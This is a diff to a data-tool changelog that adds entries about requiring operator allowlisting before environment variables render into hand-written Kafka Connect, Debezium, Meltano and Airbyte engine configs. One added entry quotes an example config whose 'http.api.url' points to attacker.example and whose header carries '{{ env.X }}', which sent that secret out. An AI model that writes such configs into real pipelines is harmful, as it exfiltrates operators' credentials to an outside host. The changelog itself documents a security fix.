@@ -256,6 +256,18 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   needs `NAME@<host it renders to>` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, and so does every
   variable sent there; a host that is this machine needs no entry. The refusal names the variable
   and says that a project dotenv file supplied it, never the value.
+- **A variable in a hand-written engine config goes only to the hosts that config names
+  (acquisition builds).** `properties.kafka-connect.sink_connector_config`,
+  `properties.debezium.server.sink.config`, `properties.debezium.extra_config`,
+  `properties.meltano.target_config` and `properties.airbyte.destination_config` are pushed to the
+  engine as written, and the pairing check read none of them: `http.api.url: https://attacker.example/x`
+  beside `headers: "{{ env.X }}"` sent X to attacker.example and exited 0. Each map is now judged like a
+  source or a sink block. The URLs and hosts it names are endpoints (and a Debezium `extra_config`
+  joins the source's, a sink config joins the sink's and the exposes'), and each variable in it
+  renders only for the endpoints the operator paired it with, `NAME@host` in
+  `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the bare `NAME` for an address the policy reads no host
+  from (`bootstrap.servers`, `database.hostname`). Airbyte's `destination_config` replaces what it
+  would derive, so it is a destination of its own.
 - **The SQL gates refuse DuckDB's logging functions and the table functions that run text.**
   `compile_free_form_sql` (the MCP output port's `query_sql`),
   `validate_sql_expression_allowlist` and `guard_against_injection_markers` now refuse a call to
@@ -374,6 +386,13 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   is then theirs) or lists `DB_HOST@<host>` and `NAME@<host>` for each variable the block sends
   there in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`. A variable the operator already exports is
   unchanged, whatever the project's file says.
+- **Acquisition builds: a variable in a hand-written engine config needs the operator's pairing.** A
+  `sink_connector_config`, `server.sink.config`, `extra_config`, `target_config` or
+  `destination_config` that holds `{{ env.NAME }}` beside a URL or a host (an HTTP sink's
+  `http.api.url`, an Iceberg `iceberg.catalog.uri`, an S3 endpoint) now stops until the operator
+  lists `NAME@<that host>` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`; a host the policy reads no
+  name for (`bootstrap.servers`) takes the bare `NAME`. A map with no URL or host in it, and a
+  loopback one, are unchanged.
 - **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
   fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
   gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
